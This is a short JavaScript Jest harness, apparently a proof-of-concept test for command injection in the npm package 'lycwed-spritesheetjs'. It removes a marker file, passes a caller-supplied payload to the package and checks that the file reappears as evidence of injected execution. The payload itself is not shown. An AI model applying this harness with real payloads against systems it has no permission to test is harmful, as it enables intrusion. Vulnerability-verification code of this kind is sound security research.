function exploitFunction(payload) {
  const spritesheet = require("lycwed-spritesheetjs");
  const fs = require("fs");

  const path = "./lycwed-spritesheetjs";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);

  expect(file_exist).toBe(false);

  spritesheet(
    "./",
    payload,
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        if (err) {
          console.error(err);
        }
      });
    }
  );
}

module.exports = { exploitFunction };